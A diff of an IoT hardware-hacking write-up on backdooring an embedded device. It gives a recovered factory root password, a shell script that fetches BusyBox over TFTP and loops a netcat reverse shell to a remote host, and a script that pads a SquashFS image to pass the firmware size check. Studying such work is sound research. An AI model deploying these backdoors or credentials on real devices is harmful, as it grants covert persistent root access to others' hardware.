@@ -505,7 +505,37 @@ DECIMAL                            HEXADECIMAL                        DESCRIPTIO
 ./1E1A62/decompressed.bin:root:x:0:0:99999:7:::
 ```
 
-## Backdoor script
+> The recovered factory password was: ***slpingenic***
+
+## Exploring the Runtime Environment and File Transfer Options
+
+> After successfully authenticating to the device, it was expected that the available userland would be based
+> on **BusyBox**, which is common for embedded Linux systems due to its small footprint. Upon inspection,
+> a BusyBox binary was indeed present, and its available applets were examined to determine whether they could
+> be leveraged for further interaction with the system.
+>
+> One of the initial goals was to establish a more flexible execution environment that could support a persistent
+> backdoor or additional tooling. However, commonly used networking utilities such as `nc` (netcat) were not
+> included in the shipped BusyBox build. Storage constraints further complicated this effort: the device’s ROM
+> was fully utilized, leaving no writable persistent storage available for adding new binaries. As a result,
+> only volatile memory (RAM) could be used for runtime modifications.
+>
+> Among the available utilities, **TFTP (Trivial File Transfer Protocol)** stood out as a viable option for
+> transferring larger binaries into memory at runtime. While limited in functionality and security, TFTP is
+> lightweight and frequently included in minimal embedded environments, making it suitable for temporary file
+> transfers during device operation.
+>
+> Initial experiments were conducted using a TFTP server hosted on a personal laptop to validate basic file
+> transfer functionality. After confirming that this approach worked, the setup was extended by deploying a TFTP
+> server on a remote virtual machine hosted on DigitalOcean. This allowed the device to retrieve files from an
+> external source without reliance on the local network environment.
+>
+> A custom shell script was then developed to automate the download of an alternative BusyBox binary into memory
+> via TFTP each time the device was restarted. I followed the instructions demonstrated in the StackSmashing video
+> *“IoT Security: Backdooring a Smart Camera by Creating a Malicious Firmware Upgrade”*, which explores similar
+> constraints in consumer IoT devices (link https://www.youtube.com/watch?v=hV8W4o-Mu2o).
+
+### Backdoor script
 
 > This shell script waits for network connectivity, downloads a BusyBox
 > binary via TFTP, and repeatedly attempts to establish a reverse shell
@@ -515,35 +545,118 @@ DECIMAL                            HEXADECIMAL                        DESCRIPTIO
 
 1. **Waits for internet access**
 
-   > The script continuously pings `google.com` until a response is received,
-   > indicating that network connectivity is available.
+> The script continuously pings `google.com` until a response is received,
+> indicating that network connectivity is available.
 
 2. **Downloads payload**
 
-   > Once the network is up, the script changes to the `/tmp` directory and
-   > downloads a MIPS little-endian BusyBox binary from a TFTP server.
+> Once the network is up, the script changes to the `/tmp` directory and
+> downloads a MIPS little-endian BusyBox binary from a TFTP server.
 
-   ```sh
-   tftp -g <ip-address> -r busybox-mipsel
-   ```
+```sh
+tftp -g <ip-address> -r busybox-mipsel
+```
 
 3. **Makes the binary executable**
 
-   > The downloaded file is marked as executable so it can be run.
+> The downloaded file is marked as executable so it can be run.
 
-   ```sh
-   chmod +x busybox-mipsel
-   ```
+```sh
+chmod +x busybox-mipsel
+```
 
 4. **Establishes a reverse shell**
 
-   > The script enters an infinite loop and repeatedly attempts to connect
-   > back to a remote host using netcat, spawning a shell on successful
-   > connection.
+> The script enters an infinite loop and repeatedly attempts to connect
+> back to a remote host using netcat, spawning a shell on successful
+> connection.
 
-   ```sh
-   ./busybox-mipsel nc <ip-address> <port> -e /bin/sh
-   ```
+```sh
+./busybox-mipsel nc <ip-address> <port> -e /bin/sh
+```
+
+```sh
+#!/bin/sh
+
+while ! ping -c 1 google.com
+do
+    sleep 1
+done
+
+cd /tmp
+tftp -g <ip-address> -r busybox-mipsel
+chmod +x busybox-mipsel
+
+while true; do
+    ./busybox-mipsel nc <ip-address> <port> -e /bin/sh
+done
+```
+
+> While the general strategy aligned with the concepts presented in that talk, the exact approach was not
+> sufficient for this device and firmware combination. Additional challenges emerged, which required further
+> analysis and iteration.
+
+## Firmware Repacking, Integrity Checks, and Persistent Access
+
+> Building on prior analysis, the next phase focused on modifying the firmware itself to enable persistent
+> functionality. A Python-based toolchain was used to unpack and repack the firmware components in the correct
+> order, following the general approach demonstrated in the StackSmashing video. This made it possible to extract
+> individual elements, including the SquashFS root filesystem, apply modifications, and reassemble the firmware
+> image.
+>
+> Initial attempts were successful in terms of unpacking and repacking: the SquashFS filesystem could be modified
+> and rebuilt using the same compression and block size parameters. However, after flashing the modified firmware
+> back to the external SPI flash, the device failed to boot. Inspection of the boot process revealed that the
+> firmware loader performed a strict validation check on the overall firmware size.
+>
+> Even small changes to the SquashFS contents resulted in size differences after recompression, making it unlikely
+> that a rebuilt filesystem would exactly match the original firmware length. This size mismatch caused the
+> firmware validation step to fail, preventing the system from completing the boot sequence.
+>
+> To address this constraint, a custom shell-based approach was developed to fine-tune the filesystem size.
+> Instead of attempting to keep all files identical, a non-critical asset within the filesystem—specifically an
+> audio file—was programmatically altered by adding or removing bytes. The filesystem was repeatedly rebuilt
+> until the final firmware image matched the exact expected size required by the bootloader.
+
+```sh
+#!/bin/bash
+
+if [ $# -ne 5 ]; then
+    echo "Usage tunesquashfs.sh <squashfs-root-dir> <block-size> <compression> <expected-size> <squashfs-output>"
+    exit
+fi
+
+while true; do
+    rm -rf ${5} 2> /dev/null
+    mksquashfs ${1} ${5} -comp ${3} -b ${2} -no-exports -noappend
+
+    random=$(tr -dc A-Za-z0-9 < /dev/urandom | head -c 13; echo)
+    size=$(unsquashfs -s ${5} | grep "Filesystem size" | grep -oE "[0-9]+{6}")
+    temp=2
+
+    if [ ${size} -eq ${4} ]; then
+        echo "Equal"
+        rm -rf 2 2> /dev/null
+        exit
+    elif [ ${size} -lt ${4} ]; then
+        echo "Add"
+        echo ${random} >> squashfs-root/lib/audio/Red_Alert.g711
+    elif [ ${size} -gt ${4} ]; then
+        echo "Remove"
+        head -c -7 squashfs-root/lib/audio/Red_Alert.g711 > 2
+        cat 2 > squashfs-root/lib/audio/Red_Alert.g711
+    fi
+
+    echo "Current size = ${size}"
+    sleep 0.2
+done
+```
+
+> Once a correctly sized firmware image was produced, it was written back to the external flash. This time,
+> the device booted successfully. After startup, the modified system behavior triggered the retrieval of an
+> external BusyBox binary hosted on a remote server. With the expanded toolset available at runtime, the device
+> was able to establish an outbound connection and provide a reverse shell with root privileges.
+
 
 ## Make squashfs filesystem
 
